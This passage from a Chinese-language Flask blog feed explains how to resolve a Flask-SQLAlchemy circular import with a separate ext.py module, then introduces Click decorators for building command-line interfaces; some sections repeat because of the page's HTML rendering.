punctuation">)</span>       <span class="token comment" spellcheck="true"># 创建数据库关系, 双向联系</span>       user <span class="token operator">=</span> db<span class="token punctuation">.</span>relationship<span class="token punctuation">(</span><span class="token string">'User2'</span><span class="token punctuation">,</span> back_populates<span class="token operator">=</span><span class="token string">'addresses'</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-python"><code class="language-python"><span class="token comment" spellcheck="true"># app.py</span><span class="token keyword">from</span> flask <span class="token keyword">import</span> Flask<span class="token keyword">import</span> config<span class="token keyword">from</span> flask_sqlalchemy <span class="token keyword">import</span> SQLAlchemy<span class="token comment" spellcheck="true"># 引入 User2,Address2</span><span class="token keyword">from</span> models <span class="token keyword">import</span> User2<span class="token punctuation">,</span>Address2app <span class="token operator">=</span> Flask<span class="token punctuation">(</span>__name__<span class="token punctuation">)</span>app<span class="token punctuation">.</span>config<span class="token punctuation">.</span>from_object<span class="token punctuation">(</span>config<span class="token punctuation">)</span>db <span class="token operator">=</span> SQLAlchemy<span class="token punctuation">(</span>app<span class="token punctuation">)</span>@app<span class="token punctuation">.</span>route<span class="token punctuation">(</span><span class="token string">'/'</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">hello_world</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> <span class="token string">'Hello World!'</span><span class="token comment" spellcheck="true"># 假设需要一个与数据库交互的模板文件</span>@app<span class="token punctuation">.</span>route<span class="token punctuation">(</span><span class="token string">'/add_user/'</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">add_user</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>       <span class="token triple-quoted-string string">"""引用ORM交互"""</span>       u1 <span class="token operator">=</span> User2<span class="token punctuation">(</span>id<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">,</span> name<span class="token operator">=</span><span class="token string">'Jack'</span><span class="token punctuation">)</span>       a1 <span class="token operator">=</span> Address2<span class="token punctuation">(</span>id<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">,</span> email_address<span class="token operator">=</span><span class="token string">'Jackxxx@xx.com'</span><span class="token punctuation">,</span> u_id<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">)</span>       a2 <span class="token operator">=</span> Address2<span class="token punctuation">(</span>id<span class="token operator">=</span><span class="token number">2</span><span class="token punctuation">,</span> email_address<span class="token operator">=</span><span class="token string">'Jack2xxx@xx.com'</span><span class="token punctuation">,</span> u_id<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">)</span>       a3 <span class="token operator">=</span> Address2<span class="token punctuation">(</span>id<span class="token operator">=</span><span class="token number">3</span><span class="token punctuation">,</span> email_address<span class="token operator">=</span><span class="token string">'Jack3xxx@xx.com'</span><span class="token punctuation">,</span> u_id<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">)</span>u1<span class="token punctuation">.</span>addresses <span class="token operator">=</span> <span class="token punctuation">[</span>a1<span class="token punctuation">,</span> a2<span class="token punctuation">,</span> a3<span class="token punctuation">]</span>db<span class="token punctuation">.</span>session<span class="token punctuation">.</span>add<span class="token punctuation">(</span>u1<span class="token punctuation">)</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>       app<span class="token punctuation">.</span>run<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>如果执行运行<code>app.py</code> 文件,会产生一个<strong>循环引用</strong> 的报错</p><pre class="line-numbers language-python">ImportError: cannot import name &#39;db&#39; from &#39;app&#39;</code></pre><p>产生的原因很简单,<code>python</code> 代码是自上而下依次执行的.<code>from models import user2</code> 文件<code>models.py</code> 会先从<code>app.py</code> 中引入<code>db</code> ,才能生成<code>User2</code> ,这就是循环引入</p><p><img src="https://cdn.jsdelivr.net/gh/ningwenyan/My_chat_picgo/2020-9-9/1599666288241-10288.png" alt="10288"></p></blockquote><h3 id="2-解决循环引入"><a href="#2-解决循环引入" class="headerlink" title="2.解决循环引入"></a>2.解决循环引入</h3><blockquote><p>为了解决他们之间的循环引入,这里需要引入第三个文件.</p><p><img src="https://cdn.jsdelivr.net/gh/ningwenyan/My_chat_picgo/2020-9-9/1599666288237-10289.png" alt="10289"></p><p>此时的目录结构如下</p><pre><code class="bash"><code class="language-python">ImportError: cannot import name &#39;db&#39; from &#39;app&#39;</code></pre><p>产生的原因很简单,<code>python</code> 代码是自上而下依次执行的.<code>from models import user2</code> 文件<code>models.py</code> 会先从<code>app.py</code> 中引入<code>db</code> ,才能生成<code>User2</code> ,这就是循环引入</p><p><img src="https://cdn.jsdelivr.net/gh/ningwenyan/My_chat_picgo/2020-9-9/1599666288241-10288.png" alt="10288"></p></blockquote><h3 id="2-解决循环引入"><a href="#2-解决循环引入" class="headerlink" title="2.解决循环引入"></a>2.解决循环引入</h3><blockquote><p>为了解决他们之间的循环引入,这里需要引入第三个文件.</p><p><img src="https://cdn.jsdelivr.net/gh/ningwenyan/My_chat_picgo/2020-9-9/1599666288237-10289.png" alt="10289"></p><p>此时的目录结构如下</p><pre><code class="bash">circular_references├── app.py                          # 主 app 文件├── config.py                        # Flask 配置文件├── models.py                    # 存放flask-sqlalchemy.Model 类├── ext.py                                # 存放 db ├── static                              #  css,js 文件目录└── templates                     # 模板文件目录<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><code>ext.py</code></p><pre class="line-numbers language-python"><code class="language-python"><span class="token keyword">from</span> flask_sqlalchemy <span class="token keyword">import</span> SQLAlchemydb <span class="token operator">=</span> SQLAlchemy<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true"># 不用绑定app,由 app.py 中绑定 app</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p><code>models.py</code></p><pre class="line-numbers language-python"><code class="language-python"><span class="token comment" spellcheck="true"># 从ext 中导入db</span><span class="token keyword">from</span> ext <span class="token keyword">import</span> db<span class="token keyword">class</span> <span class="token class-name">User2</span><span class="token punctuation">(</span>db<span class="token punctuation">.</span>Model<span class="token punctuation">)</span><span class="token punctuation">:</span>       __tablename__ <span class="token operator">=</span> <span class="token string">'user2'</span>       id <span class="token operator">=</span> db<span class="token punctuation">.</span>Column<span class="token punctuation">(</span>db<span class="token punctuation">.</span>Integer<span class="token punctuation">,</span> primary_key<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">,</span> autoincrement<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">,</span> nullable<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">)</span>       name <span class="token operator">=</span> db<span class="token punctuation">.</span>Column<span class="token punctuation">(</span>db<span class="token punctuation">.</span>String<span class="token punctuation">(</span><span class="token number">20</span><span class="token punctuation">)</span><span class="token punctuation">)</span>       <span class="token comment" spellcheck="true"># 创建数据库关系, 双向联系</span>       addresses <span class="token operator">=</span> db<span class="token punctuation">.</span>relationship<span class="token punctuation">(</span><span class="token string">'Address2'</span><span class="token punctuation">,</span> back_populates<span class="token operator">=</span><span class="token string">'user'</span><span class="token punctuation">)</span><span class="token keyword">class</span> <span class="token class-name">Address2</span><span class="token punctuation">(</span>db<span class="token punctuation">.</span>Model<span class="token punctuation">)</span><span class="token punctuation">:</span>       __tablename__ <span class="token operator">=</span> <span class="token string">'address2'</span>       id <span class="token operator">=</span> db<span class="token punctuation">.</span>Column<span class="token punctuation">(</span>db<span class="token punctuation">.</span>Integer<span class="token punctuation">,</span> primary_key<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">,</span> autoincrement<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">,</span> nullable<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">)</span>       email_address <span class="token operator">=</span> db<span class="token punctuation">.</span>Column<span class="token punctuation">(</span>db<span class="token punctuation">.</span>String<span class="token punctuation">(</span><span class="token number">45</span><span class="token punctuation">)</span><span class="token punctuation">,</span> nullable<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">)</span>       u_id <span class="token operator">=</span> db<span class="token punctuation">.</span>Column<span class="token punctuation">(</span>db<span class="token punctuation">.</span>Integer<span class="token punctuation">,</span> db<span class="token punctuation">.</span>ForeignKey<span class="token punctuation">(</span><span class="token string">'user2.id'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>       <span class="token comment" spellcheck="true"># 创建数据库关系, 双向联系</span>       user <span class="token operator">=</span> db<span class="token punctuation">.</span>relationship<span class="token punctuation">(</span><span class="token string">'User2'</span><span class="token punctuation">,</span> back_populates<span class="token operator">=</span><span class="token string">'addresses'</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><code>app.py</code></p><pre class="line-numbers language-python"><code class="language-python"><span class="token keyword">from</span> flask <span class="token keyword">import</span> Flask<span class="token keyword">import</span> config<span class="token comment" spellcheck="true"># 引入db</span><span class="token keyword">from</span> ext <span class="token keyword">import</span> db<span class="token comment" spellcheck="true"># 引入 User2,Address2</span><span class="token keyword">from</span> models <span class="token keyword">import</span> User2<span class="token punctuation">,</span>Address2app <span class="token operator">=</span> Flask<span class="token punctuation">(</span>__name__<span class="token punctuation">)</span>app<span class="token punctuation">.</span>config<span class="token punctuation">.</span>from_object<span class="token punctuation">(</span>config<span class="token punctuation">)</span><span class="token comment" spellcheck="true"># 利用init_app()方法绑定app</span>db<span class="token punctuation">.</span>init_app<span class="token punctuation">(</span>app<span class="token punctuation">)</span>@app<span class="token punctuation">.</span>route<span class="token punctuation">(</span><span class="token string">'/'</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">hello_world</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>         <span class="token keyword">return</span> <span class="token string">'Hello World!'</span><span class="token comment" spellcheck="true"># 假设需要一个与数据库交互的模板文件</span>@app<span class="token punctuation">.</span>route<span class="token punctuation">(</span><span class="token string">'/add_user/'</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">add_user</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>       <span class="token triple-quoted-string string">"""引用ORM交互"""</span>       u1 <span class="token operator">=</span> User2<span class="token punctuation">(</span>id<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">,</span> name<span class="token operator">=</span><span class="token string">'Jack'</span><span class="token punctuation">)</span>       a1 <span class="token operator">=</span> Address2<span class="token punctuation">(</span>id<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">,</span> email_address<span class="token operator">=</span><span class="token string">'Jackxxx@xx.com'</span><span class="token punctuation">,</span> u_id<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">)</span>       a2 <span class="token operator">=</span> Address2<span class="token punctuation">(</span>id<span class="token operator">=</span><span class="token number">2</span><span class="token punctuation">,</span> email_address<span class="token operator">=</span><span class="token string">'Jack2xxx@xx.com'</span><span class="token punctuation">,</span> u_id<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">)</span>       a3 <span class="token operator">=</span> Address2<span class="token punctuation">(</span>id<span class="token operator">=</span><span class="token number">3</span><span class="token punctuation">,</span> email_address<span class="token operator">=</span><span class="token string">'Jack3xxx@xx.com'</span><span class="token punctuation">,</span> u_id<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">)</span>       u1<span class="token punctuation">.</span>addresses <span class="token operator">=</span> <span class="token punctuation">[</span>a1<span class="token punctuation">,</span> a2<span class="token punctuation">,</span> a3<span class="token punctuation">]</span>       db<span class="token punctuation">.</span>session<span class="token punctuation">.</span>add<span class="token punctuation">(</span>u1<span class="token punctuation">)</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>       app<span class="token punctuation">.</span>run<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>由于<code>python</code>自上而下执行,到执行<code>User2()</code> 函数时,它执行的是绑定<code>app</code>的<code>db</code> .</p></blockquote><p><img src="https://cdn.jsdelivr.net/gh/ningwenyan/My_chat_picgo/wechat.png" alt="wechat"></p><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/kity@2.0.4/dist/kity.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/kityminder-core@1.4.50/dist/kityminder.core.min.js"></script><script defer="true" type="text/javascript" src="https://cdn.jsdelivr.net/npm/hexo-simple-mindmap@0.2.0/dist/mindmap.min.js"></script><link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/npm/hexo-simple-mindmap@0.2.0/dist/mindmap.min.css">]]></content>
      
      
      <categories>
          
          <category> SQLAlchemy Flask </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Flask </tag>
            
            <tag> Flask_SQLAlchemy </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>创建漂亮的Flask命令行界面</title>
      <link href="/posts/45623.html"/>
      <url>/posts/45623.html</url>
      
        <content type="html"><![CDATA[<p><img src="https://cdn.jsdelivr.net/gh/ningwenyan/My_chat_picgo/2020-9-9/1599665192366-10287.png" alt="10287"></p><h2 id="创建漂亮的Flask命令行界面"><a href="#创建漂亮的Flask命令行界面" class="headerlink" title="创建漂亮的Flask命令行界面"></a>创建漂亮的Flask命令行界面</h2><h3 id="click"><a href="#click" class="headerlink" title="click"></a><code>click</code></h3><blockquote><p><code>Click</code> 可以帮助写出跟漂亮的命令行接口.官网<code>https://click.palletsprojects.com/en/7.x/</code></p><p>比如官网的实例:(更多参数请查询官方<code>API</code>)</p><pre class="line-numbers language-python"><code class="language-python"><span class="token comment" spellcheck="true"># hello.py</span><span class="token keyword">import</span> click@click<span class="token punctuation">.</span>command<span class="token punctuation">(</span><span class="token punctuation">)</span>@click<span class="token punctuation">.</span>option<span class="token punctuation">(</span><span class="token string">'--count'</span><span class="token punctuation">,</span> default<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">,</span> help<span class="token operator">=</span><span class="token string">'Number of greetings.'</span><span class="token punctuation">)</span>@click<span class="token punctuation">.</span>option<span class="token punctuation">(</span><span class="token string">'--name'</span><span class="token punctuation">,</span> prompt<span class="token operator">=</span><span class="token string">'Your name'</span><span class="token punctuation">,</span>help<span class="token operator">=</span><span class="token string">'The person to greet.'</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">hello</span><span class="token punctuation">(</span>count<span class="token punctuation">,</span> name<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token triple-quoted-string string">"""Simple program that greets NAME for a total of COUNT times."""</span>     <span class="token keyword">for</span> x <span class="token keyword">in</span> range<span class="token punctuation">(</span>count<span class="token punctuation">)</span><span class="token punctuation">:</span>         click<span class="token punctuation">.</span>echo<span class="token punctuation">(</span><span class="token string">'Hello %s!'</span> <span class="token operator">%</span> name<span class="token punctuation">)</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>     hello<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>运行结果</p><pre class="line-numbers language-bash"><code class="language-bash">$ python hello.py --count<span class="token operator">=</span>3Your name: JohnHello John<span class="token operator">!</span>Hello John<span class="token operator">!</span>Hello John<span class="token operator">!</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>它能自动生成帮助信息</p><pre class="line-numbers language-bash"><code class="language-bash">$ python hello.py --helpUsage: hello.py <span class="token punctuation">[</span>OPTIONS<span class="token punctuation">]</span>Simple program that greets NAME <span class="token keyword">for</span> a total of COUNT times.Options:--count INTEGER  Number of greetings.--name TEXT      The person to greet.--help           Show this message and exit.<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>如果没有安装,需要使用<code>pip</code>安装</p><pre class="line-numbers language-bash">$ pip install click</code></pre></blockquote><h4 id="使用click-command-装饰器"><a href="#使用click-command-装饰器" class="headerlink" title="使用click.command() 装饰器"></a>使用<code>click.command()</code> 装饰器</h4><blockquote><p>Click 中最基础的就是单个命令(command)，通过装饰器<code>@click.command()</code> 可以将一个 Python 方法转换为一个 Click 命令。最简单的情况下如下所示：</p><pre><code class="python"><code class="language-bash">$ pip install click</code></pre></blockquote><h4 id="使用click-command-装饰器"><a href="#使用click-command-装饰器" class="headerlink" title="使用click.command() 装饰器"></a>使用<code>click.command()</code> 装饰器</h4><blockquote><p>Click 中最基础的就是单个命令(command)，通过装饰器<code>@click.command()</code> 可以将一个 Python 方法转换为一个 Click 命令。最简单的情况下如下所示：</p><pre><code class="python">#  click_manager.pyimport click@click.command()def hello():     click.echo('Hello World!')if __name__ == '__main__':    hello()<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>在终端运行,类型这样</p><pre class="line-numbers language-bash"><code class="language-bash">$ python click_manager.pyHello World<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>这里为什么要使用<code>click.echo()</code>而不是<code>print()</code>?官网的解释是为了同时支持<code>python2</code> 和<code>python3</code> ,如果不需要它,可以使用<code>print()</code> 函数</p></blockquote><h4 id="使用click-option-装饰器"><a href="#使用click-option-装饰器" class="headerlink" title="使用click.option() 装饰器"></a>使用<code>click.option()</code> 装饰器</h4><blockquote><p>Click 中的 option 是命令中的参数获取方式，可以通过不同的形式获取输入参数</p><p>最基础的情况下可以使用 option 表示一个基础的输入参数:</p><pre class="line-numbers language-python"><code class="language-python">@click<span class="token punctuation">.</span>command<span class="token punctuation">(</span><span class="token punctuation">)</span>@click<span class="token punctuation">.</span>option<span class="token punctuation">(</span><span class="token string">'--email'</span><span class="token punctuation">,</span>default<span class="token operator">=</span>None<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">add_email</span><span class="token punctuation">(</span>email<span class="token punctuation">)</span><span class="token punctuation">:</span>        click<span class="token punctuation">.</span>echo<span class="token punctuation">(</span><span class="token string">'email:{}'</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>email<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>        add_email<span class="token punctuation">(</span><span class="token punctuation">)</span>   <span class="token comment" spellcheck="true"># 注意,这里执行的是单个命令</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>这里执行的都是单个命令,所以最后指定了<code>add_email()</code></p><p>执行</p><pre class="line-numbers language-bash"><code class="language-bash">$ python click_manager.py  --email<span class="token operator">=</span>xxx@xx.comemail:xxx@xx.com<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>除了最基本的用法,还有一个可选择的参数</p><ul><li>使用<code>nargs</code>可以支持多个同样类型的参数<pre class="line-numbers language-python"><code class="language-python">@click<span class="token punctuation">.</span>command<span class="token punctuation">(</span><span class="token punctuation">)</span>@click<span class="token punctuation">.</span>option<span class="token punctuation">(</span><span class="token string">'--pos'</span><span class="token punctuation">,</span> nargs<span class="token operator">=</span><span class="token number">2</span><span class="token punctuation">,</span> type<span class="token operator">=</span>float<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">findme</span><span class="token punctuation">(</span>pos<span class="token punctuation">)</span><span class="token punctuation">:</span>  click<span class="token punctuation">.</span>echo<span class="token punctuation">(</span><span class="token string">'%s / %s'</span> <span class="token operator">%</span> pos<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre></li></ul><p>“””<br>命令行<br>$ findme –pos 2.0 3.0<br>2.0/3.0<br>“””</p><pre><code>- 使用类型元组支持多个不同类型的参数```python@click.command()@click.option(&#39;--item&#39;, type=(str, int))def putitem(item):    click.echo(&#39;name=%s id=%d&#39; % item)&quot;&quot;&quot;$ putitem --item peter 1338name=peter id=1338&quot;&quot;&quot;    </code></pre><ul><li>使用<code>/</code> 分开参数表示布尔值</li></ul><pre class="line-numbers language-python"><code class="language-python"><span class="token keyword">import</span> sys@click<span class="token punctuation">.</span>command<span class="token punctuation">(</span><span class="token punctuation">)</span>@click<span class="token punctuation">.</span>option<span class="token punctuation">(</span><span class="token string">'--shout/--no-shout'</span><span class="token punctuation">,</span> default<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">info</span><span class="token punctuation">(</span>shout<span class="token punctuation">)</span><span class="token punctuation">:</span>    rv <span class="token operator">=</span> sys<span class="token punctuation">.</span>platform    <span class="token keyword">if</span> shout<span class="token punctuation">:</span>        rv <span class="token operator">=</span> rv<span class="token punctuation">.</span>upper<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">'!!!!111'</span>    click<span class="token punctuation">.</span>echo<span class="token punctuation">(</span>rv<span class="token punctuation">)</span><span class="token triple-quoted-string string">"""$ info --shoutLINUX!!!!111$ info --no-shoutlinux"""</span>    <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><ul><li>使用<code>clickchoice()</code> 用于指定参数从特定列表中选择</li></ul><pre class="line-numbers language-python">@click.option(&#39;--hash-type&#39;, type=click.Choice([&#39;md5&#39;, &#39;sha1&#39;]))</code></pre><ul><li>使用<code>prompt</code> 实现交互式的输入</li></ul><pre><code class="python">@click.option(&#39;--name&#39;, prompt=&#39;Your name please&#39;)</code></pre><ul><li>使用<code>hide_input</code> 可以实现隐藏输入,使用<code>confirmation_prompt</code>,实现两次输入并对比,适合密码输入的情况</li></ul><pre><code class="python">@click.option(&#39;--password&#39;, prompt=True, hide_input=True,  confirmation_prompt=True)</code></pre><ul><li>使用<code>envvar</code> 可以获取环境变量中的值</li></ul><pre><code class="python">@click.option(&#39;--username&#39;, envvar=&#39;USERNAME&#39;)</code></pre><ul><li>使用<code>IntRange</code> 获取特定范围类的值</li></ul><pre><code class="python">@click.option(&#39;--digit&#39;, type=click.IntRange(0, 10))</code></pre></blockquote><h4 id="使用click-argument-装饰器"><a href="#使用click-argument-装饰器" class="headerlink" title="使用click.argument() 装饰器"></a>使用<code>click.argument()</code> 装饰器</h4><blockquote><p><code>argument</code> 与<code>option</code> 类似,但是<code>argument</code> 指定的是位置参数.它支持<code>option</code> 的部分功能.</p><p>最基础的情况下,使用和<code>option</code> 类似.一般需要自动特定参数对应的类型,如果不指定,会使<code>string</code> 类型.</p><pre><code class="python"><code class="language-python">@click.option(&#39;--hash-type&#39;, type=click.Choice([&#39;md5&#39;, &#39;sha1&#39;]))</code></pre><ul><li>使用<code>prompt</code> 实现交互式的输入</li></ul><pre><code class="python">@click.option(&#39;--name&#39;, prompt=&#39;Your name please&#39;)</code></pre><ul><li>使用<code>hide_input</code> 可以实现隐藏输入,使用<code>confirmation_prompt</code>,实现两次输入并对比,适合密码输入的情况</li></ul><pre><code class="python">@click.option(&#39;--password&#39;, prompt=True, hide_input=True,  confirmation_prompt=True)</code></pre><ul><li>使用<code>envvar</code> 可以获取环境变量中的值</li></ul><pre><code class="python">@click.option(&#39;--username&#39;, envvar=&#39;USERNAME&#39;)</code></pre><ul><li>使用<code>IntRange</code> 获取特定范围类的值</li></ul><pre><code class="python">@click.option(&#39;--digit&#39;, type=click.IntRange(0, 10))</code></pre></blockquote><h4 id="使用click-argument-装饰器"><a href="#使用click-argument-装饰器" class="headerlink" title="使用click.argument() 装饰器"></a>使用<code>click.argument()</code> 装饰器</h4><blockquote><p><code>argument</code> 与<code>option</code> 类似,但是<code>argument</code> 指定的是位置参数.它支持<code>option</code> 的部分功能.</p><p>最基础的情况下,使用和<code>option</code> 类似.一般需要自动特定参数对应的类型,如果不指定,会使<code>string</code> 类型.</p><pre><code class="python">@click.command()@click.argument('filename')def touch(filename):     click.echo(filename)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>高级用法:</p><ul><li>支持可变参数,利用<code>nargs</code>可以支持可变的参数,<code>nargs=-1</code> 表示不限数量的参数.</li></ul><pre class="line-numbers language-python"><code class="language-python">@click<span class="token punctuation">.</span>command<span class="token punctuation">(</span><span class="token punctuation">)</span>@click<span class="token punctuation">.</span>argument<span class="token punctuation">(</span><span class="token string">'src'</span><span class="token punctuation">,</span> nargs<span class="token operator">=</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span>@click<span class="token punctuation">.</span>argument<span class="token punctuation">(</span><span class="token string">'dst'</span><span class="token punctuation">,</span> nargs<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">copy</span><span class="token punctuation">(</span>src<span class="token punctuation">,</span> dst<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">for</span> fn <span class="token keyword">in</span> src<span class="token punctuation">:</span>        click<span class="token punctuation">.</span>echo<span class="token punctuation">(</span><span class="token string">'move %s to folder %s'</span> <span class="token operator">%</span> <span class="token punctuation">(</span>fn<span class="token punctuation">,</span> dst<span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><ul><li>支持文件类型</li></ul><pre class="line-numbers language-python">@click.argument(&#39;input&#39;, type=click.File(&#39;rb&#39;))</code></pre><ul><li>支持文件路径类型</li></ul><pre><code class="python">@click.argument(&#39;f&#39;, type=click.Path(exists=True))</code></pre></blockquote><h4 id="命令组嵌套命令"><a href="#命令组嵌套命令" class="headerlink" title="命令组嵌套命令"></a>命令组嵌套命令</h4><blockquote><p>可以将命令分组进行管理，在使用中可以使用<code>@click.group()</code> 装饰器指定组，此后可以使用组名构建子命令。同时可以设定组内命令的回调，组内的任意子命令执行时，都可以触发回调。使用如下所示：</p><pre><code class="python"><code class="language-python">@click.argument(&#39;input&#39;, type=click.File(&#39;rb&#39;))</code></pre><ul><li>支持文件路径类型</li></ul><pre><code class="python">@click.argument(&#39;f&#39;, type=click.Path(exists=True))</code></pre></blockquote><h4 id="命令组嵌套命令"><a href="#命令组嵌套命令" class="headerlink" title="命令组嵌套命令"></a>命令组嵌套命令</h4><blockquote><p>可以将命令分组进行管理，在使用中可以使用<code>@click.group()</code> 装饰器指定组，此后可以使用组名构建子命令。同时可以设定组内命令的回调，组内的任意子命令执行时，都可以触发回调。使用如下所示：</p><pre><code class="python">@click.group()@click.option('--debug/--no-debug', default=False)def cli(debug):         click.echo('Debug mode is %s' % ('on' if debug else 'off'))@cli.command()def sync():         click.echo('Synching')<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>在上面的代码中可以看到，使用<code>@click.group()</code> 装饰器装饰了<code>cli()</code> 方法，<code>cli</code> 可以理解为组名，后续即可使用<code>@cli.command()</code> 代替<code>@click.command()</code> 装饰<code>sync()</code> 方法，<code>sync()</code> 方法就是组内的子命令，而<code>cli()</code>方法即为子命令执行后出发的回调。可以看到执行子命令<code>sync()</code> 方法后的现场如下所示：</p><pre class="line-numbers language-bash"><code class="language-bash">$ tool.py --debug <span class="token function">sync</span>Debug mode is onSynching<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>可以看到上面的执行情况，子命令<code>sync</code> 执行时，不仅执行了<code>sync()</code> 方法中的代码，还执行了回调方法<code>cli()</code> 方法中的代码。</p><p>在使用命令组时，还可以在命令组和子命令之间进行参数的传递，此时可以使用<code>@click.pass_context</code> 装饰器进行，具体的细节可以查看<a href="https://click.palletsprojects.com/en/7.x/commands/" target="_blank" rel="noopener">官方文档</a> 。</p></blockquote><h4 id="任意执行命令"><a href="#任意执行命令" class="headerlink" title="任意执行命令"></a>任意执行命令</h4><blockquote><p>Click 与 Flask-script 的使用极其类似，而且更灵活，更强大。但是直接使用<code>@click.command()</code> 看起来似乎是每次执行确定的单个命令，有没有办法实现类似 Flask-script 一样任意选择的命令呢 ？</p><p>答案是可以的，但是必须借助于命令组，建立一个命令组，执行的命令都是命令组的子命令，执行时就可以通过参数指定执行的命令了，因此最终替代的 Flask-script 的 Click 代码如下所示：</p><pre class="line-numbers language-python"><code class="language-python"><span class="token comment" spellcheck="true"># manage.py </span>@click<span class="token punctuation">.</span>group<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">cli</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token 